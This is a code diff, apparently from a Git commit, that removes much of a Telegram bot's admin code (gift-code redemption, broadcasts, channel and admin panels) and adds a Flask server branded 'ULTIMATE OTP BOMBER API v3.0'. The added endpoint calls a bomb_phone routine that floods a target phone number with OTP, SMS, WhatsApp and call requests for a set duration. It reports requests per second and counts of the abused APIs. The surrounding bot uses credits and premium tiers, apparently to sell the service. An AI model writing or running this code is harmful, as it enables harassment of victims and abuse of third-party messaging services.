-    if not gift:
-        await update.message.reply_text("❌ *Invalid code.* Double-check and try again.", parse_mode=ParseMode.MARKDOWN); return
-
-    _code, credits, max_uses, used_count, _by, _at, active = gift
-
-    if not active:
-        await update.message.reply_text("❌ *This code has been deactivated.*", parse_mode=ParseMode.MARKDOWN); return
-
-    if used_count >= max_uses:
-        await update.message.reply_text("❌ *This code has already reached its usage limit.*", parse_mode=ParseMode.MARKDOWN); return
-
-    if db_has_claimed(code, user.id):
-        await update.message.reply_text("❌ *You've already redeemed this code.*", parse_mode=ParseMode.MARKDOWN); return
-
-    # All checks passed — claim it
-    db_claim_gift(code, user.id)
-    db_add_credits(user.id, credits)
-    new_credits = (db_get_user(user.id) or (0,0,0,0))[3]
-
-    await update.message.reply_text(
-        f"🎉 *Code Redeemed Successfully!*\n\n"
-        f"🎁 Code: `{code}`\n"
-        f"💰 Credits added: *+{credits}*\n"
-        f"💳 Your total credits: *{new_credits}*\n\n"
-        f"Enjoy! 🚀",
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Broadcast a message to all verified users.
-    Usage:
-      - Reply to any message with /broadcast  → forwards that message
-      - /broadcast Hello everyone!            → sends plain text
-    """
-    # Get broadcast content
-    if update.message.reply_to_message:
-        reply_msg = update.message.reply_to_message
-        use_forward = True
-    elif context.args:
-        broadcast_text = " ".join(context.args)
-        use_forward = False
-    else:
-        await update.message.reply_text(
-            "📣 *Broadcast Usage:*\n\n"
-            "1️⃣ Reply to any message with `/broadcast`\n"
-            "2️⃣ Or: `/broadcast Your message here`",
-            parse_mode=ParseMode.MARKDOWN,
-        )
-        return
-
-    user_ids = db_get_all_user_ids()
-    total    = len(user_ids)
-
-    if total == 0:
-        await update.message.reply_text("📭 No verified users to broadcast to.")
-        return
-
-    status = await update.message.reply_text(
-        f"📣 *Broadcasting to {total} users...*\n\n"
-        f"[{'░'*10}] 0%",
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-    sent = 0
-    failed = 0
-
-    for i, uid in enumerate(user_ids):
-        try:
-            if use_forward:
-                await reply_msg.forward(uid)
-            else:
-                await context.bot.send_message(
-                    uid,
-                    f"📢 *Message from Admin*\n\n{broadcast_text}",
-                    parse_mode=ParseMode.MARKDOWN,
-                )
-            sent += 1
-        except Exception:
-            failed += 1
-
-        # Update progress every 10 users
-        if (i + 1) % 10 == 0 or (i + 1) == total:
-            pct   = int(((i + 1) / total) * 100)
-            filled = int(pct / 10)
-            bar   = "█" * filled + "░" * (10 - filled)
-            try:
-                await status.edit_text(
-                    f"📣 *Broadcasting...*\n\n"
-                    f"[{bar}] {pct}%\n\n"
-                    f"✅ Sent: {sent} | ❌ Failed: {failed}",
-                    parse_mode=ParseMode.MARKDOWN,
-                )
-            except Exception:
-                pass
-        await asyncio.sleep(0.05)  # avoid flood limits
-
-    await status.edit_text(
-        f"✅ *Broadcast Complete!*\n\n"
-        f"📤 Total: *{total}*\n"
-        f"✅ Sent: *{sent}*\n"
-        f"❌ Failed: *{failed}*",
-        parse_mode=ParseMode.MARKDOWN,
-    )
-
-
-async def _try_add_channel(update, context, chat_ref):
-    try:
-        chat = await context.bot.get_chat(chat_ref)
+        result = asyncio.run(bomber.bomb_phone(clean_phone, duration))
+        return jsonify({
+            "status": "success",
+            "message": f"✅ Bombed {result['phone']} using {result['total_apis']} APIs",
+            "stats": {
+                "successful_requests": result['success'],
+                "failed_requests": result['failed'],
+                "total_requests": result['success'] + result['failed'],
+                "duration_seconds": result['duration'],
+                "requests_per_second": result['requests_per_second']
+            }
+        })
     except Exception as e:
-        await update.message.reply_text(f"❌ Couldn't find channel.\n`{e}`",parse_mode=ParseMode.MARKDOWN); return
-    try:
-        bm = await context.bot.get_chat_member(chat.id, context.bot.id)
-        if bm.status not in ("administrator","creator"):
-            await update.message.reply_text(
-                f"⚠️ Bot is *not admin* in *{html.escape(chat.title)}*.\n\nMake it admin first, then try again.",
-                parse_mode=ParseMode.MARKDOWN); return
-    except Exception as e:
-        await update.message.reply_text(f"❌ Can't verify admin status.\n`{e}`",parse_mode=ParseMode.MARKDOWN); return
-    url = f"https://t.me/{chat.username}" if chat.username else (chat.invite_link or "")
-    if not url:
-        try: url = await context.bot.export_chat_invite_link(chat.id)
-        except Exception: url = ""
-    db_add_channel(chat.id, chat.title, url)
-    await update.message.reply_text(f"✅ *{html.escape(chat.title)}* added! 🎉",parse_mode=ParseMode.MARKDOWN)
+        return jsonify({"error": str(e)}), 500
 
+@app.route('/status')
+def status():
+    """Get service status"""
+    return jsonify({
+        "status": "online",
+        "total_apis": len(ULTIMATE_OTP_APIS),
+        "call_apis": len(CALL_APIS),
+        "whatsapp_apis": len(WHATSAPP_APIS),
+        "sms_apis": len(SMS_APIS)
+    })
 
-# -----------------------------------------------------------------------
-# Admin inline callbacks
-# -----------------------------------------------------------------------
-async def on_admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not db_is_admin(query.from_user.id):
-        await query.answer("🚫 Admins only.", show_alert=True); return
-    await query.answer()
-    data     = query.data
-    is_owner = query.from_user.id == OWNER_ID
+@app.route('/apis')
+def list_apis():
+    """Get list of all APIs"""
+    return jsonify({
+        "total": len(ULTIMATE_OTP_APIS),
+        "apis": [{"name": api.get("name", "Unknown"), "method": api.get("method", "POST")} for api in ULTIMATE_OTP_APIS]
+    })
 
-    if data == "adm_home":
-        await query.edit_message_text("🛠️ *Admin Panel*\n\nChoose a category 👇",
-                                      parse_mode=ParseMode.MARKDOWN, reply_markup=admin_keyboard())
-    elif data == "adm_credits":
-        await query.edit_message_text(
-            "💰 *Credit Commands*\n\n"
-            "`/addcredit <uid> <amount>`\n`/removecredit <uid> <amount>`\n`/setcredit <uid> <amount>`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data == "adm_premium":
-        await query.edit_message_text(
-            "💎 *Premium Commands*\n\n`/addpremium <uid>`\n`/removepremium <uid>`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data == "adm_channels":
-        chs = db_list_channels()
-        ch_text = "\n".join([f"📢 {c['name']} — `{c['chat_id']}`" for c in chs]) if chs else "_(none yet)_"
-        await query.edit_message_text(
-            f"📢 *Channels*\n\n"
-            f"`/addchannel @user` — public\n"
-            f"`/addchannel` — private (forward post)\n"
-            f"`/removechannel <id>` — remove\n\n"
-            f"*Current:*\n{ch_text}",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data == "adm_admins":
-        ids   = db_list_admins()
-        lines = [f"👑 `{OWNER_ID}` (owner)"] + [f"🛠️ `{i}`" for i in ids]
-        text  = "👑 *Admins*\n\n" + "\n".join(lines)
-        if is_owner: text += "\n\n`/addadmin <uid>` · `/removeadmin <uid>`"
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data == "adm_stats":
-        s = db_get_stats()
-        await query.edit_message_text(
-            "📊 *Bot Statistics*\n\n"
-            f"👥 Total users: *{s['total_users']}*\n"
-            f"✅ Verified: *{s['verified']}*\n\n"
-            f"🚀 Total API uses: *{s['total_uses']}*\n"
-            f"👤 Unique users: *{s['unique_users']}*\n"
-            f"🔢 Unique codes: *{s['unique_codes']}*\n\n"
-            f"🕐 First use: `{s['first_use']}`\n"
-            f"🕐 Last use: `{s['last_use']}`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data in ("adm_status","adm_toggle"):
-        if data=="adm_toggle":
-            db_set_setting("bot_enabled","0" if is_bot_enabled() else "1")
-        enabled = is_bot_enabled()
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔴 Turn OFF" if enabled else "🟢 Turn ON", callback_data="adm_toggle")],
-            [InlineKeyboardButton("🔙 Back", callback_data="adm_home")],
-        ])
-        await query.edit_message_text(
-            f"⚙️ *Bot Status:* {'🟢 ON' if enabled else '🔴 OFF'}",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
-    elif data == "adm_video":
-        vid = get_video()
-        vs  = f"`{vid[:50]}...`" if vid and vid!="NONE" else "_(not set)_"
-        await query.edit_message_text(
-            f"🎬 *Dashboard/Start Video*\n\nCurrent: {vs}\n\n"
-            "`/setvideo` — send or reply to a video\n"
-            "`/clearvideo` — remove video",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-    elif data == "adm_userinfo":
-        await query.edit_message_text(
-            "ℹ️ *User Info*\n\n`/userinfo <user_id>`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-
-    elif data == "adm_gifts":
-        gifts = db_list_gifts()
-        if not gifts:
-            gift_text = "_(no codes yet)_"
-        else:
-            lines = []
-            for g in gifts[:8]:
-                code, credits, max_uses, used, active = g
-                st = "✅" if active else "❌"
-                lines.append(f"{st} `{g[0]}` — {credits}cr | {used}/{max_uses}")
-            gift_text = "\n".join(lines)
-        await query.edit_message_text(
-            f"🎁 *Gift Codes*\n\n"
-            f"`/giftcode <CODE> <credits> <max_uses>` — create\n"
-            f"`/giftcode WELCOME 5 100` — example (5cr, 100 uses)\n"
-            f"`/deletegift <CODE>` — deactivate\n"
-            f"`/listgifts` — full list\n\n"
-            f"*Recent codes:*\n{gift_text}",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-
-    elif data == "adm_broadcast":
-        await query.edit_message_text(
-            "📣 *Broadcast*\n\n"
-            "Reply to any message with `/broadcast` — forwards it to all verified users.\n\n"
-            "Or: `/broadcast Your text here`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=admin_back())
-
-
-# -----------------------------------------------------------------------
-# Maintenance gate
-# -----------------------------------------------------------------------
-async def maintenance_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if not user:
-        return
-    if db_is_admin(user.id):
-        return
-    if not is_bot_enabled():
-        if update.callback_query:
-            await update.callback_query.answer("🔴 Bot is currently OFF!", show_alert=True)
-        elif update.message:
-            await update.message.reply_text(
-                "🔴 *Bot is currently OFF*\n\nMaintenance in progress — check back later! 🙏",
-                parse_mode=ParseMode.MARKDOWN)
-        raise ApplicationHandlerStop
-
-
-# -----------------------------------------------------------------------
-# Main
-# -----------------------------------------------------------------------
-def main():
-    db_init()  # ensure tables exist before anything runs
-    log.info("Database: %s", DB_PATH)
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(TypeHandler(Update, maintenance_gate), group=-1)
-
-    app.add_handler(CommandHandler("start",         start))
-    app.add_handler(CommandHandler("admin",         admin_panel))
-    app.add_handler(CommandHandler("addcredit",     admin_addcredit))
-    app.add_handler(CommandHandler("removecredit",  admin_removecredit))
-    app.add_handler(CommandHandler("setcredit",     admin_setcredit))
-    app.add_handler(CommandHandler("addpremium",    admin_addpremium))
-    app.add_handler(CommandHandler("removepremium", admin_removepremium))
-    app.add_handler(CommandHandler("userinfo",      admin_userinfo))
-    app.add_handler(CommandHandler("offbot",        admin_offbot))
-    app.add_handler(CommandHandler("onbot",         admin_onbot))
-    app.add_handler(CommandHandler("listadmins",    admin_listadmins))
-    app.add_handler(CommandHandler("addadmin",      admin_addadmin))
-    app.add_handler(CommandHandler("removeadmin",   admin_removeadmin))
-    app.add_handler(CommandHandler("addchannel",    admin_addchannel))
-    app.add_handler(CommandHandler("removechannel", admin_removechannel))
-    app.add_handler(CommandHandler("listchannels",  admin_listchannels))
-    app.add_handler(CommandHandler("setvideo",      admin_setvideo))
-    app.add_handler(CommandHandler("clearvideo",    admin_clearvideo))
-    app.add_handler(CommandHandler("apitest",       admin_apitest))
-    app.add_handler(CommandHandler("stats",         admin_stats))
-    app.add_handler(CommandHandler("broadcast",     admin_broadcast))
-    app.add_handler(CommandHandler("giftcode",      admin_giftcode))
-    app.add_handler(CommandHandler("deletegift",    admin_deletegift))
-    app.add_handler(CommandHandler("listgifts",     admin_listgifts))
-    app.add_handler(CommandHandler("redeem",        cmd_redeem))
-
-    app.add_handler(CallbackQueryHandler(on_verify,    pattern="^verify$"))
-    app.add_handler(CallbackQueryHandler(on_stop,      pattern="^stop$"))
-    app.add_handler(CallbackQueryHandler(on_admin_cb,  pattern="^adm_"))
-
-    app.add_handler(MessageHandler(
-        (filters.TEXT | filters.VIDEO) & ~filters.COMMAND, on_message))
-
-    log.info("Bot starting...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+# ==================================================================
+# 🚀 RUN SERVER
+# ==================================================================
+if __name__ == '__main__':
+    print("""
+    ╔═══════════════════════════════════════════════════════════╗
+    ║                                                           ║
+    ║   🔥 ULTIMATE OTP BOMBER API v3.0                        ║
+    ║                                                           ║
+    ║   📦 Total APIs: {}                                  ║
+    ║   📞 Call APIs: {}                                      ║
+    ║   💬 WhatsApp APIs: {}                                 ║
+    ║   📱 SMS APIs: {}                                     ║
+    ║                                                           ║
+    ║   🚀 Server running at: http://localhost:5000            ║
+    ║   📡 Endpoint: /bomber?number=9876543210               ║
+    ║                                                           ║
+    ╚═══════════════════════════════════════════════════════════╝
+    """.format(len(ULTIMATE_OTP_APIS), len(CALL_APIS), len(WHATSAPP_APIS), len(SMS_APIS)))
+    
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
